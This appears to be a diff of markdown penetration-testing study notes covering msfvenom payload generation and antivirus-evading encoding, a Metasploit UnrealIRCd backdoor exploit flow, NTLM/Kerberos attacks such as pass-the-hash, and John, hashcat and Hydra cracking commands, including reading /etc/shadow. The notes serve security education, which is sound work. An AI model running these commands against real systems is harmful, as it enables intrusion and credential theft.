+    - `-f <format>` e.g. `-f exe` or `-f raw` (shellcode)
+  - Encoding (old tool: `msfencode`)
+    - Used to avoid antivirus detection
+    - Done by `-b` or `-e` flags
+    - `-i <number>` allows encoding multiple times for more stealth
+- E.g. `msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python`
+- See also [msfvenom | Hiding files](../06-system-hacking/hiding-files.md#msfvenom)
+
+#### `msfconsole`
+
+- All-in-one centralized console for all of the options available in the MSF
+- Contains the most features and is the most stable MSF interface
+- E.g. flow for using unreal exploit:
+  1. Run `msfconsole`
+  2. You can search for a service e.g. `unrealirc`
+     - ❗Disclosure date is not same as when vulnerability found, it can be before but not published.
+  3. Use with `use exploit/unix/irc/unreal_ircd_3281_backdoor`
+     - There can be multiple payloads, check with `show payload` and then set with `set PAYLOAD <name>`
+     - Set required options (`show options` to list) and `set <option-name> <option-value>`to set
+  4. Run exploit using `exploit`
+     - Hopefully you'll end up in terminal session as root :)
 # Cracking passwords overview
 
 - Recovering passwords from the transmitted or stored data on computer systems.
@@ -4772,6 +4567,457 @@ environment variable named `HTTP_SIKE` available in your CGI.
 - 📝 Linux hashed passwords lies in `/etc/shadow/` so you can attack on that.
 - Linux usually use SHA512, you can find method in `/etc/login.defs`
 - In older systems password information was stored in `/etc/passwd`, now it holds only user account information.
+# Microsoft authentication
+
+- Windows stores passwords in hashed form using either:
+  - **Security Accounts Manager (SAM) Database**
+    - A file stored at `%SystemRoot%/system32/config/SAM`
+    - Locked by Windows kernel to prevent copying/moving
+      - Usually stolen through bootable CD/USBs.
+  - **Active Directory Database**
+    - Stored on a domain controller in a database
+    - Located in either `%SystemRoot%\NTDS\Ntds.dit` or `%SystemRoot%\System32\Ntds.dit`
+
+## NTLM authentication
+
+- New Technology (NT) LAN Manager (LM)
+- Security protocols, default authentication scheme
+- 📝 Consists of LM and NTLM authentication protocols
+  - Challenge-response authentication protocols
+  - Each stores user passwords in SAM database using different hash methodologies
+  - 💡 Try all as many systems still keep older authentication for backwards compatibility.
+- 💡 Insecure, can be disabled through GPO (Group Policy Object) with [privacy.sexy](https://privacy.sexy)
+
+### LM vs NTLM
+
+#### LM
+
+- LM is the oldest password protocol dating back to OS/2 in 1980's
+- **LM Hash**
+  - E.g. `aad3c435b514a4eeaad3b935b51304f`
+  - 📝 **Flow**
+    1. Convert all lower case to upper case (case-insensitive)
+    2. Pad password to 14 characters with NULL characters
+    3. Split the password to two 7 character chunks
+    4. Create two DES keys from each 7 character chunk
+    5. DES encrypt the string "`KGS!@#$%`" with these two chunks
+    6. Concatenate the two DES encrypted strings = LM hash.
+- **Authentication flow**
+  1. Client ends authentication request
+  2. Server response with a challenge
+  3. Client responds with DES encrypted LM hash with challenge as key
+- **Weaknesses**
+  - No salting allowing MITM attacks (through [pass the hash](#pass-the-hash-attack) and rainbow tables).
+  - If password is less than 7 characters second half is always `0xAAD3B435B51404EE`
+  - Maximum allowed length is 14 characters
+  - Case insensitive: PassWord, PaSsWoRd, PASSword and other similar combinations are same as PASSWORD.
+  - 💡 Turned off as default since Windows Vista/Server 2008 as it's weak
+- **Cracking**
+
+  ```txt
+    john --format=lm hash.txt
+    hashcat -m 3000 -a 3 hash.txt
+  ```
+
+#### NTLM
+
+- Also known as ***NT LAN Manager***
+- Uses DES with MD4 hash, used in Windows NT until SP3
+- **NTLM Hash**
+  - Also known as ***NTLM hash***, ***NTHash***, ***NT hash**'.
+  - Algorithm: `MD4(UTF-16-LE(password))`
+    - UTF-16-LE is the little endian UTF-16
+  - E.g. `B4B9B02E6F09A9BD760F388B67351E2B`
+  - **Cracking**
+    1. Can be extracted using e.g. SAM database or [mimikatz](https://github.com/gentilkiwi/mimikatz)
+    2. Then
+
+    ```txt
+      john --format=netntlm hash.txt
+      hashcat -m 5500 -a 3 hash.txt
+    ```
+
+##### NTLMv1
+
+- Also known as ***Net-NTLMv1***
+- Uses both the NT and LM hash, depending on configuration and what is available.
+- Deprecated, but still used in some old systems on the network.
+- E.g.  
+
+  ```txt
+    u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
+  ```
+
+- **Authentication flow**
+  1. `C = 8-byte server challenge, random`
+     - Server sends sending an 8-byte random number, the challenge
+  2. `K1 | K2 | K3 = NTLM-Hash | 5-bytes-0`
+     - Five zeroes are added to the hash to achieve 21 bytes
+     - 21 bytes is split into three 7 byte parts
+  3. `response = DES(K1,C) | DES(K2,C) | DES(K3,C)`
+     - Each part is used as key in DES
+     - Three encryptions are reunited to form the 24-byte response
+- **Cracking**
+  - 💡 Easy to crack as it lacks salting
+  1. Can be captured using [Responder](https://github.com/lgandx/Responder)
+  2. Then
+
+  ```txt
+    john --format=netntlm hash.txt
+    hashcat -m 5500 -a 3 hash.txt
+  ```
+
+##### NTLM v2
+
+- Also known as ***Net-NTLMv2***
+- Uses MD5
+- Introduced in Windows NT 4.0 SP1 (Windows 2000)
+- E.g.
+
+  ```txt
+    admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
+  ```
+
+- Replaces NTLM with
+  - stronger cryptography against spoofing attacks
+  - ability to authenticate the client
+- **Authentication flow**
+  1. `SC = 8-byte server challenge, random`
+     - Server sends sending an 8-byte random number, the challenge
+  2. `CC = 8-byte client challenge, random`
+     - 8-byte random value for the challenge
+  3. `CC* = (X, time, CC2, domain name)`
+     - `time`: the current time in NT Time format
+     - `CC2`: an 8-byte random value
+     - `X`: fixed contents of a formatting field.
+  4. `v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)`
+     - HMAC-MD5 hash of users password and domain name with other identifying information
+  5. `LMv2 = HMAC-MD5(v2-Hash, SC, CC)`
+  6. `NTv2 = HMAC-MD5(v2-Hash, SC, CC*)`
+  7. `response = LMv2 | CC | NTv2 | CC*`
+- Cracking it
+  1. Can be captured using [Responder](https://github.com/lgandx/Responder)
+  2. Then:
+
+  ```txt
+    john --format=netntlmv2 hash.txt
+    hashcat -m 5600 -a 3 hash.txt
+  ```
+
+### Pass the hash attack
+
+- Also known as **pass-the-hash**
+- Allows gaining access to systems without accessing password in plaintext
+- Can be used on any systems using LM or NTLM authentication
+- Exploits static hash that's shared between sessions in authentication protocol
+- Helps to hack Windows user name, domain name, and password hashes
+- Can dump hashes
+  - from compromised machines by e.g. [Windows Credentials Editor](https://www.ampliasecurity.com/research/wcefaq.html) and [Pass-the-Hash Toolkit](https://en.wikipedia.org/wiki/Pass_the_hash)
+  - or sniff the network
+- Allows privilege escalation as domain administrators connected to machine also leaves their hashes.
+
+## Kerberos authentication
+
+- Network authentication protocol for client/server applications
+- Protects against replay attacks and eavesdropping
+- Uses both symmetric and asymmetric encryption
+- Uses TCP/UDP port 88
+- **Mutual authentication**
+  - Both parties verifies each others identity using tickets.
+
+### Kerberos authentication components
+
+- Requires **Key Distribution Center (KDC)** that consists of:
+  - **Authentication server (AS)**
+  - **Ticket Granting Server (TGS)**
+- **Ticket Granting Ticket (TGT)**
+  - Small, encrypted file with limited validity
+  - Protects users from MITM attacks
+  - Includes session key, its expiration date, and the user's IP address
+
+### Kerberos authentication flow
+
+1. Client asks KDC (who has AS and TGS) for ticket to authenticate throughout the network.
+   - This request is in clear text.
+2. Server responds with secret key.
+   - Hashed by the password copy kept on AD server (TGT).
+3. TGT sent back to server requesting TGS if user decrypts.
+4. Server responds with ticket, and client can log on and access network resources.
+
+### Pass the ticket attacks
+
+- Also known as **pass-the-ticket**
+- Authentication Method using Kerberos tickets without having access to an account's password.
+- Kerberos tickets are retrieved e.g. from memory on a system
+- Tools include [mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus)
+# Password cracking tools
+
+- See also [Web server password cracking tools | Web server threats and attacks](./../12-web-servers/web-server-threats-and-attacks.md#web-server-password-cracking-tools)
+
+## `crunch`
+
+- Generates password dictionaries.
+- E.g. `crunch <min-length> <max-length> <character-pool> -o <file-name>`
+- Difficulty/time grows exponentially not linearly
+  - Takes much longer when you e.g. increase total chars in a password.
+  - E.g. `crunch 4 16 abcekfeafkapeo434@*.` generates thousands of petabytes.
+
+## John the Ripper
+
+- Also known as • ***JtR*** or ***`john`***
+- 📝 Auto-detects OS password based on dictionary or brute-force attacks.
+- Tries different passwords and compares their hashes to OS password
+- Supports Windows, Linux and macOS.
+- 📝 Usage:
+  1. Dump OS password to a file.
+     - E.g. on Linux, John has `unshadow` tool that can be used.: `unshadow /etc/passwd /etc/shadow > mypasswd`
+  2. Crack password file using default order: `john mypasswd`
+     - Passwords are saved in `$JOHN/john.pot`
+     - You can also run `john --show mypasswd` to see the passwords
+
+## Hydra
+
+- Parallelized login cracker for different network protocols such as HTTP, Cisco, MySQl.
+- 💡 You can use [DVWA: damn vulnerable web app](http://www.dvwa.co.uk/) for educational purposes & learning pen-testing
+- E.g. `hydra -L usernamelist.txt -P passlist.txt -e ns -F -t 1 -w 10 <host-ip-address> http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -v`
+  - `-e ns`: e additional options
+    - `n`: try null (for empty password)
+    - `s`: try also same password as a user name
+  - `-t 1`: number of tasks (based on threads), default is 16
+    - ❗ Careful. Too many connections and too quick = Detected immediately
+  - `-w 10`: waiting time of 10 ms
+  - `<host-ip-address>`
+    - Usually people go to the target using proxies and examine results in proxies.
+      - E.g. [burp suite](./../05-vulnerabilities/vulnerability-analysis.md#burp-suite)
+  - `http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed`
+    - Posts data to server as the HTML does
+    - `Login failed`: text to search in result page to determine whether the login has failed.
+
+## Hashcat
+
+- Very fast, GPU-based password cracker with in-kernel rule engine
+- Can do dictionary hash attack, brute force hash, role based attack and more
+- [Website](https://hashcat.net/hashcat/) | [source code](https://github.com/hashcat/hashcat)
+- 💡 Good idea to use in cloud to get more compute power.
+- Proper drivers are required for e.g. AMD and Intel and NVIDIA
+- E.g. cracking Linux OS password
+  - `./hashcat64.bin -a 3 -m 1800 ?u?l?l?l?d?d?d`
+    - `-m 1800`: Hash mode `sha512crypt $6$, SHA512 (Unix)`
+    - `-a 3 ?u?l?l?l?d?d?d`: Mask attack
+      - Brute-force on user specified character sets
+      - `?u?l?l?l?d?d?d`= uppercase + lowercase + lowercase + lowercase + number + number + number
+      - 💡 Do certain assumptions or it might take until the next big bang to crack the password.
+      - E.g. usually passwords start with capital letter and continues with lowercase letters
+
+## Password recovery tools
+
+- [Elcomsoft Distributed Password Recovery](https://www.elcomsoft.com/edpr.html)
+  - Data recovery and password recovery services
+  - Runs on Windows
+  - For forensic and government agencies
+  - Can crack systems passwords for Windows, Unix and Mac OS and many more other passwords.
+- [Passware Kit Forensic](https://www.passware.com/kit-forensic/)
+  - Tool for encrypted electronic evidence discovery and decryption
+  - Can crack systems passwords for Windows, Unix and Mac OS and [many more other passwords](https://www.passware.com/kit-forensic/filetypes/).
+
+### Windows password reset tools
+
+- Resets Windows login passwords.
+- Often can run from a bootable USB or CD/DVD.
+- Include • [Stellar Password Recovery](https://www.stellarinfo.com/password-recovery/password-recovery-software.php) • [Windows Password Recovery Pro ISeePassword](https://www.iseepassword.com/windows-password-recovery.html) • [Windows Password Recovery Tool](https://www.windowspasswordsrecovery.com/) • [Windows Password Refixer](https://www.isumsoft.com/windows-password-refixer/) • [PCUnlocker](http://www.pcunlocker.com/)
+
+#### chntpw
+
+- Also known as [Offline NT Password & Registry Editor](http://www.chntpw.com/)
+- 📝 Linux utility used for resetting or blanking local passwords used by Windows.
+# Linux basics
+
+- See also Linux log files
+
+## Linux folders
+
+- `/`: Root
+- `/var`: Variable Data / Log Files
+  - See also [Linux security logs | Covering tracks](./covering-tracks.md#linux-security-logs)
+- `/bin`: Binaries / User Commands
+- `/sbin`: Sys Binaries / Admin Commands
+- `/root`: Home dir for root user
+- `/boot`: Store kernel
+- `/proc`: Direct access to kernel
+- `/dev`: Hardware storage devices
+- `/mnt`: Mount devices
+- `/etc`: Contain all your system configuration files in it e.g.
+  - [Hosts file](./../10-social-engineering/social-engineering-types.md#pharming)
+  - [Firewall settings](./../11-firewalls-ids-and-honeypots/firewall-overview.md#firewalld)
+  - [Password files](./cracking-passwords-overview.md#linux-passwords)
+  - `/etc/sudoers` that controls
+    - Who can run what commands as what users on what machines
+    - Special things such as whether you need a password for particular commands
+- See also [path obfuscation | Evading IDS](./../11-firewalls-ids-and-honeypots/evading-ids.md#path-obfuscation)
+
+## File permissions in Linux
+
+- Assigned via the use of the binary equivalent for each `rwx` group
+- Read-only is equivalent to 4, write is 2, and execute is 1
+- To accumulate permissions, add the numbers
+  - 4 is read-only
+  - 6 is read and write
+  - 7 is read, write and execute
+- Order
+  - First number corresponds to the user
+  - Second to the group
+  - Third is to all others.  
+- E.g. `chmod 744 anyfile`
+  - Allow all privileges to the user, read-only for the group, read-only for all others.
+
+## Run processes in background
+
+- Using `&` will cause the program to run in the background.
+- Makes it only useful for programs that do not need input.
+- The program will terminate if you log out
+- Program can be brought to foreground using `fg <job-number>`
+
+## 📝 Common linux commands
+
+- `adduser` / `addgroup`: adds a new user and group to a system.
+- `apropos`: quickly searches the names and descriptions of all available man pages.
+- `ar`: creates, modifies, or extracts archives.
+- `arch`: prints the machine's architecture.
+- `bzip2`: creates compressed file archives in bzip2 format.
+- `cal` / `ncal`: displays a calendar in the output.
+- `cat`: concatenates files, or data provided on standard input, and prints it on the standard output.
+- `cd`: changes user's present working directory.
+- `chattr`: lists and edits extended filesystem attributes for files and folders like the immutable attribute.
+- `chgrp`: changes the group ownership of a file.
+- `chmod`: changes access permissions for a file.
+- `chown`: changes the ownership and group of a file.
+- `cksum`: prints the CRC checksum and byte count for the input.
+- `clear`: clears the terminal screen.
+- `cmp`: perform byte-by-byte comparison of two files.
+- `comm`: compare two sorted files line-by-line.
+- `cp`: copying files and directories.
+- `cpulimit`: limits the CPU usage of a process
+- `csh`: switches between Linux user shells.
+- `csplit`: splits a file into sections determined by context lines.
+- `curl`: downloads files from the internet by HTTP or HTTPS.
+- `date`: prints or sets the system date and time.
+- `dd`: copies a file, converting and formatting according to the operands.
+- `df`: displays the file system disk space usage in output.
+- `diff` | `diff3`: compare two files line by line.
+- `dig`: query DNS servers and to resolve DNS records.
+- `dir`: lists directory contents.
+- `dirname`: strips last component from a file name/path.
+- `dmesg`: prints or controls the kernel ring buffer.
+- `dmidecode`: command prints a system's DMI (aka SMBIOS) table contents in a human-readable format.
+- `dpkg`: a package manager for Debian/Debian-based systems.
+- `du`: displays disk usage of files present in a directory as well as its sub-directories.
+- `echo`: displays whatever input text is given to it.
+- `ed`: a line-oriented text editor.
+- `eject`: eject removable media (typically, a CD ROM or floppy disk).
+- `env`: displays the current environment, and edit it.
+- `exit`: causes the shell to exit.
+- `expand`: converts tabs present in the input file(s) into spaces, and writes the file contents to standard output.
+- `expr`: evaluates expressions e.g. `expr 1 + 2` outputs `3`.
+- `factor`: prints the prime factors of the input number.
+- `fgrep`: grep with -F option not treating regular expression metacharacters as special, processing the information as simple string instead.
+- `find`: search for files in a directory as well as its sub-directories.
+- `fold`: wraps each input line to fit in specified width.
+- `free`: displays the amount of free and used memory in the system.
+- `grep`: searches for a specified pattern in a file (or files) and displays in output lines containing that pattern.
+- `groups`: displays the name of groups a user is part of.
+- `gzip`: compresses the input file, replacing the file itself with one having a .gz extension.
+- `gunzip`: compressed with gzip command can be restored to their original form using the gunzip command.
+- `head`: displays the first 10 lines of the file to standard output.
+- `hostname`: displays and sets the system's host name.
+- `history`: display the history of commands that you typed in on the shell.
+- `id`: prints user and group information for the current user or specified username.
+- `ifconfig`: fetch esinformation related to network interfaces and configure network interfaces.
+- `join`: joins lines of two files on a common field.
+- `kill`: helps user kill a process by its ID sending the TERM signal to it.
+- `killall`: kills a process by its name.
+- `last`: shows listing of last logged in users.
+- `ldd`: displays in output dependencies of a shared library.
+- `ln`: creates link between files.
+- `locate`: locate command helps user find a file by name.
+- `logname`: prints the user-name of the current user.
+- `look`: displays lines beginning with a given string.
+- `ls`: lists contents of a directory in output.
+- `lshw`: extracts and displays detailed information on the hardware configuration of the machine.
+- `lscpu`: displays in output system's CPU architecture information (such as number of CPUs, threads, cores, sockets, and more).
+- `lsof`: displays information related to files opened by processes.
+- `man`: access reference manual for commands, programs/utilities, as well as functions.
+- `md5sum`: print or check MD5 (128-bit) checksums.
+- `mkdir`: creates directories.
+- `mkfifo`: creates named pipes.
+- `more`: a filter for paging through text one screenful at a time.
+- `mv`: either moves a file from one directory to another, or renames it.
+- `nano`: launches the 'nano' text editor.
+- `netstat`: prints network connections, routing tables, interface statistics, masquerade connections, and multicast memberships.
+  - Used for e.g. [Port monitoring | Malware analysis](./../07-malware/malware-analysis.md#port-monitoring)
+- `nice`: runs a program with modified scheduling priority.
+- `nl`: writes contents of a file to output, and prepends each line with line number.
+- `nm`: display symbols from object files.
+- `nproc`: displays the number of processing units available to the current process.
+- `od`: dump files in octal as well as some other formats.
+- `passwd`: used for changing passwords for user accounts.
+- `paste`: merges lines of files
+- `pidof`: gives the process ID of a running program/process.
+- `ping`: checks whether or not a system is up and responding.
+- `ps`: displays information (in the form of a snapshot) about the currently active processes.
+- `pstree`: produces information about running processes in the form of a tree.
+- `pwd`: displays the name of current/working directory.
+- `rm`: removes files and/or directories.
+- `rmdir`: deletes empty directories.
+- `scp`: securely copies files between systems on a network.
+- `screen`: keeps a terminal session open even when your SSH connection is interrupted,
+- `sdiff`: performs a side-by-side merge of differences between two files.
+- `sed`: a stream editor that allows users to perform basic text transformations on an input stream (a file or input from a pipeline).
+- `seq`: prints numbers from FIRST to LAST, in steps of INCREMENT,
+- `sha1sum`: print or check SHA1 (160-bit) checksums.
+- `shutdown`: shut the system in a safe way.
+- `size`: lists the section sizes as well as the total size for an object or archive file.
+- `sleep`: specify delay for a specified amount of time.
+- `sort`: sort lines of text files.
+- `split`: splits a file into fixed-size pieces.
+- `ssh`: basically OpenSSH SSH client.
+- `ssh-keygen`: creates a private/public key pair for SSH.
+- `stat`: displays status related to a file or a file-system.
+- `strings`: displays in output printable character sequences that are at least 4 characters long.
+- `su`: change user-identity.
+- `sudo`: lets a permitted user run a command as another user (usually root or superuser).
+- `sum`: prints checksum and block counts for each input file.
+- `tac`: prints input files in reverse.
+- `tail`: displays in output the last 10 lines of a file.
+- `talk`: lets users talk with each other.
+- `tar`: creates as well as extract archive files.
+- `tee`: reads from standard input and write to standard output as well as files.
+- `test`: checks file types and compare values.
+- `time`: summarizes system resource usage of a program.
+- `top`: gives a dynamic real-time view of a running system (in terms of its processes).
+- `touch`: changes file timestamps (the access and modification times).
+- `tr`: translates/squeezes/deletes characters.
+- `tty`: prints the filename of the terminal connected to standard input.
+- `uname`: prints certain system information.
+- `unexpand`: convert spaces into tabs.
+- `uniq`: report or omit repeated lines.
+- `unexpand`: converts spaces present in the input file(s) into tabs, and writes the file contents to standard output.
+- `uptime`: tells how long the system has been running.
+- `users`: displays in output the usernames of users currently logged in to the current host.
+- `vdir`: lists information about contents of a directory (current directory by default).
+- `vim`: text/programming editor.
+- `w`: displays information about the users currently on the machine, and their processes.
+- `wall`: writes and sends a message to other users that are currently logged in.
+- `watch`: monitors a program's output.
+- `wc`: prints newline, word, and byte counts for a file.
+- `wget`: perform a non-interactive download of files from the Web.
+- `whatis`: displays single-line manual page descriptions.
+- `which`: locates a command - the file and the path of the file that gets executed.
+- `who`: shows who is logged on.
+- `whereis`: shows in output locations of the binary, source, and manual page files for a command.
+- `whoami`: prints effective `userid` of the current user.
+- `xargs`: builds and executes command lines from standard input.
+- `yes`: outputs a string repeatedly until killed.
+- `zcat`: displays the content of gzip compressed files.
 # Escalating privileges
 
 - Exploiting OS and software vulnerabilities to gain admin privileges.
@@ -5140,669 +5386,93 @@ environment variable named `HTTP_SIKE` available in your CGI.
       - `set LPORT 4444`
       - `exploit`
 - See also [MSFvenom | Automated penetration testing tools](./../05-vulnerabilities/automated-penetration-testing-tools.md#msfvenom)
-# Linux basics
-
-- See also Linux log files
-
-## Linux folders
-
-- `/`: Root
-- `/var`: Variable Data / Log Files
-  - See also [Linux security logs | Covering tracks](./covering-tracks.md#linux-security-logs)
-- `/bin`: Binaries / User Commands
-- `/sbin`: Sys Binaries / Admin Commands
-- `/root`: Home dir for root user
-- `/boot`: Store kernel
-- `/proc`: Direct access to kernel
-- `/dev`: Hardware storage devices
-- `/mnt`: Mount devices
-- `/etc`: Contain all your system configuration files in it e.g.
-  - [Hosts file](./../10-social-engineering/social-engineering-types.md#pharming)
-  - [Firewall settings](./../11-firewalls-ids-and-honeypots/firewall-overview.md#firewalld)
-  - [Password files](./cracking-passwords-overview.md#linux-passwords)
-  - `/etc/sudoers` that controls
-    - Who can run what commands as what users on what machines
-    - Special things such as whether you need a password for particular commands
-- See also [path obfuscation | Evading IDS](./../11-firewalls-ids-and-honeypots/evading-ids.md#path-obfuscation)
-
-## File permissions in Linux
-
-- Assigned via the use of the binary equivalent for each `rwx` group
-- Read-only is equivalent to 4, write is 2, and execute is 1
-- To accumulate permissions, add the numbers
-  - 4 is read-only
-  - 6 is read and write
-  - 7 is read, write and execute
-- Order
-  - First number corresponds to the user
-  - Second to the group
-  - Third is to all others.  
-- E.g. `chmod 744 anyfile`
-  - Allow all privileges to the user, read-only for the group, read-only for all others.
-
-## Run processes in background
-
-- Using `&` will cause the program to run in the background.
-- Makes it only useful for programs that do not need input.
-- The program will terminate if you log out
-- Program can be brought to foreground using `fg <job-number>`
-
-## 📝 Common linux commands
-
-- `adduser` / `addgroup`: adds a new user and group to a system.
-- `apropos`: quickly searches the names and descriptions of all available man pages.
-- `ar`: creates, modifies, or extracts archives.
-- `arch`: prints the machine's architecture.
-- `bzip2`: creates compressed file archives in bzip2 format.
-- `cal` / `ncal`: displays a calendar in the output.
-- `cat`: concatenates files, or data provided on standard input, and prints it on the standard output.
-- `cd`: changes user's present working directory.
-- `chattr`: lists and edits extended filesystem attributes for files and folders like the immutable attribute.
-- `chgrp`: changes the group ownership of a file.
-- `chmod`: changes access permissions for a file.
-- `chown`: changes the ownership and group of a file.
-- `cksum`: prints the CRC checksum and byte count for the input.
-- `clear`: clears the terminal screen.
-- `cmp`: perform byte-by-byte comparison of two files.
-- `comm`: compare two sorted files line-by-line.
-- `cp`: copying files and directories.
-- `cpulimit`: limits the CPU usage of a process
-- `csh`: switches between Linux user shells.
-- `csplit`: splits a file into sections determined by context lines.
-- `curl`: downloads files from the internet by HTTP or HTTPS.
-- `date`: prints or sets the system date and time.
-- `dd`: copies a file, converting and formatting according to the operands.
-- `df`: displays the file system disk space usage in output.
-- `diff` | `diff3`: compare two files line by line.
-- `dig`: query DNS servers and to resolve DNS records.
-- `dir`: lists directory contents.
-- `dirname`: strips last component from a file name/path.
-- `dmesg`: prints or controls the kernel ring buffer.
-- `dmidecode`: command prints a system's DMI (aka SMBIOS) table contents in a human-readable format.
-- `dpkg`: a package manager for Debian/Debian-based systems.
-- `du`: displays disk usage of files present in a directory as well as its sub-directories.
-- `echo`: displays whatever input text is given to it.
-- `ed`: a line-oriented text editor.
-- `eject`: eject removable media (typically, a CD ROM or floppy disk).
-- `env`: displays the current environment, and edit it.
-- `exit`: causes the shell to exit.
-- `expand`: converts tabs present in the input file(s) into spaces, and writes the file contents to standard output.
-- `expr`: evaluates expressions e.g. `expr 1 + 2` outputs `3`.
-- `factor`: prints the prime factors of the input number.
-- `fgrep`: grep with -F option not treating regular expression metacharacters as special, processing the information as simple string instead.
-- `find`: search for files in a directory as well as its sub-directories.
-- `fold`: wraps each input line to fit in specified width.
-- `free`: displays the amount of free and used memory in the system.
-- `grep`: searches for a specified pattern in a file (or files) and displays in output lines containing that pattern.
-- `groups`: displays the name of groups a user is part of.
-- `gzip`: compresses the input file, replacing the file itself with one having a .gz extension.
-- `gunzip`: compressed with gzip command can be restored to their original form using the gunzip command.
-- `head`: displays the first 10 lines of the file to standard output.
-- `hostname`: displays and sets the system's host name.
-- `history`: display the history of commands that you typed in on the shell.
-- `id`: prints user and group information for the current user or specified username.
-- `ifconfig`: fetch esinformation related to network interfaces and configure network interfaces.
-- `join`: joins lines of two files on a common field.
-- `kill`: helps user kill a process by its ID sending the TERM signal to it.
-- `killall`: kills a process by its name.
-- `last`: shows listing of last logged in users.
-- `ldd`: displays in output dependencies of a shared library.
-- `ln`: creates link between files.
-- `locate`: locate command helps user find a file by name.
-- `logname`: prints the user-name of the current user.
-- `look`: displays lines beginning with a given string.
-- `ls`: lists contents of a directory in output.
-- `lshw`: extracts and displays detailed information on the hardware configuration of the machine.
-- `lscpu`: displays in output system's CPU architecture information (such as number of CPUs, threads, cores, sockets, and more).
-- `lsof`: displays information related to files opened by processes.
-- `man`: access reference manual for commands, programs/utilities, as well as functions.
-- `md5sum`: print or check MD5 (128-bit) checksums.
-- `mkdir`: creates directories.
-- `mkfifo`: creates named pipes.
-- `more`: a filter for paging through text one screenful at a time.
-- `mv`: either moves a file from one directory to another, or renames it.
-- `nano`: launches the 'nano' text editor.
-- `netstat`: prints network connections, routing tables, interface statistics, masquerade connections, and multicast memberships.
-  - Used for e.g. [Port monitoring | Malware analysis](./../07-malware/malware-analysis.md#port-monitoring)
-- `nice`: runs a program with modified scheduling priority.
-- `nl`: writes contents of a file to output, and prepends each line with line number.
-- `nm`: display symbols from object files.
-- `nproc`: displays the number of processing units available to the current process.
-- `od`: dump files in octal as well as some other formats.
-- `passwd`: used for changing passwords for user accounts.
-- `paste`: merges lines of files
-- `pidof`: gives the process ID of a running program/process.
-- `ping`: checks whether or not a system is up and responding.
-- `ps`: displays information (in the form of a snapshot) about the currently active processes.
-- `pstree`: produces information about running processes in the form of a tree.
-- `pwd`: displays the name of current/working directory.
-- `rm`: removes files and/or directories.
-- `rmdir`: deletes empty directories.
-- `scp`: securely copies files between systems on a network.
-- `screen`: keeps a terminal session open even when your SSH connection is interrupted,
-- `sdiff`: performs a side-by-side merge of differences between two files.
-- `sed`: a stream editor that allows users to perform basic text transformations on an input stream (a file or input from a pipeline).
-- `seq`: prints numbers from FIRST to LAST, in steps of INCREMENT,
-- `sha1sum`: print or check SHA1 (160-bit) checksums.
-- `shutdown`: shut the system in a safe way.
-- `size`: lists the section sizes as well as the total size for an object or archive file.
-- `sleep`: specify delay for a specified amount of time.
-- `sort`: sort lines of text files.
-- `split`: splits a file into fixed-size pieces.
-- `ssh`: basically OpenSSH SSH client.
-- `ssh-keygen`: creates a private/public key pair for SSH.
-- `stat`: displays status related to a file or a file-system.
-- `strings`: displays in output printable character sequences that are at least 4 characters long.
-- `su`: change user-identity.
-- `sudo`: lets a permitted user run a command as another user (usually root or superuser).
-- `sum`: prints checksum and block counts for each input file.
-- `tac`: prints input files in reverse.
-- `tail`: displays in output the last 10 lines of a file.
-- `talk`: lets users talk with each other.
-- `tar`: creates as well as extract archive files.
-- `tee`: reads from standard input and write to standard output as well as files.
-- `test`: checks file types and compare values.
-- `time`: summarizes system resource usage of a program.
-- `top`: gives a dynamic real-time view of a running system (in terms of its processes).
-- `touch`: changes file timestamps (the access and modification times).
-- `tr`: translates/squeezes/deletes characters.
-- `tty`: prints the filename of the terminal connected to standard input.
-- `uname`: prints certain system information.
-- `unexpand`: convert spaces into tabs.
-- `uniq`: report or omit repeated lines.
-- `unexpand`: converts spaces present in the input file(s) into tabs, and writes the file contents to standard output.
-- `uptime`: tells how long the system has been running.
-- `users`: displays in output the usernames of users currently logged in to the current host.
-- `vdir`: lists information about contents of a directory (current directory by default).
-- `vim`: text/programming editor.
-- `w`: displays information about the users currently on the machine, and their processes.
-- `wall`: writes and sends a message to other users that are currently logged in.
-- `watch`: monitors a program's output.
-- `wc`: prints newline, word, and byte counts for a file.
-- `wget`: perform a non-interactive download of files from the Web.
-- `whatis`: displays single-line manual page descriptions.
-- `which`: locates a command - the file and the path of the file that gets executed.
-- `who`: shows who is logged on.
-- `whereis`: shows in output locations of the binary, source, and manual page files for a command.
-- `whoami`: prints effective `userid` of the current user.
-- `xargs`: builds and executes command lines from standard input.
-- `yes`: outputs a string repeatedly until killed.
-- `zcat`: displays the content of gzip compressed files.
-# Microsoft authentication
-
-- Windows stores passwords in hashed form using either:
-  - **Security Accounts Manager (SAM) Database**
-    - A file stored at `%SystemRoot%/system32/config/SAM`
-    - Locked by Windows kernel to prevent copying/moving
-      - Usually stolen through bootable CD/USBs.
-  - **Active Directory Database**
-    - Stored on a domain controller in a database
-    - Located in either `%SystemRoot%\NTDS\Ntds.dit` or `%SystemRoot%\System32\Ntds.dit`
-
-## NTLM authentication
-
-- New Technology (NT) LAN Manager (LM)
-- Security protocols, default authentication scheme
-- 📝 Consists of LM and NTLM authentication protocols
-  - Challenge-response authentication protocols
-  - Each stores user passwords in SAM database using different hash methodologies
-  - 💡 Try all as many systems still keep older authentication for backwards compatibility.
-- 💡 Insecure, can be disabled through GPO (Group Policy Object) with [privacy.sexy](https://privacy.sexy)
-
-### LM vs NTLM
-
-#### LM
-
-- LM is the oldest password protocol dating back to OS/2 in 1980's
-- **LM Hash**
-  - E.g. `aad3c435b514a4eeaad3b935b51304f`
-  - 📝 **Flow**
-    1. Convert all lower case to upper case (case-insensitive)
-    2. Pad password to 14 characters with NULL characters
-    3. Split the password to two 7 character chunks
-    4. Create two DES keys from each 7 character chunk
-    5. DES encrypt the string "`KGS!@#$%`" with these two chunks
-    6. Concatenate the two DES encrypted strings = LM hash.
-- **Authentication flow**
-  1. Client ends authentication request
-  2. Server response with a challenge
-  3. Client responds with DES encrypted LM hash with challenge as key
